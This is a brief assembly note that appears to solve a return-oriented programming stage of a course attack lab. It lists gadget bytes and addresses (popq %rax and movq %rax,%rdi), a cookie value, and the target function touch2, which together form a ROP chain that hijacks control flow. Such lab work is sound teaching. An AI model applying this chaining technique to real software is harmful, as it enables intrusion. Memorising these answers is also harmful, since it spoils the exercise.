popq %rax
nop             ; * n
ret             ; -> 58 {90}{n} c3       -> 0x4019a7+4=0x4019ab
; cookie        ; 0x59b997fa
movq %rax, %rdi
nop             ; * n
ret             ; -> 48 89 c7 {90}{n} c3 -> 0x4019a0+2=0x4019a2
; touch2        ; 0x4017ec
